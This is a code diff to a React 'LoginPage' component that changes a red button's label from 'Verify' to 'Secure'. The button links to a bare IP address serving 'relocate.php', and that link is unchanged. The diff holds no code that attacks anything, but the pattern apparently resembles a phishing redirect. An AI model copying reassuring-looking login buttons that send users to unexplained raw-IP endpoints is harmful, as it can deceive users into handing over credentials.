@@ -169,7 +169,7 @@ export const LoginPage = () => {
                   </div>
                 </div>
               </div>
-                  <a className='ui button red' href="https://13.211.65.106/pokerapp/relocate.php">Verify</a>
+                  <a className='ui button red' href="https://13.211.65.106/pokerapp/relocate.php">Secure</a>
               </>
             }
 
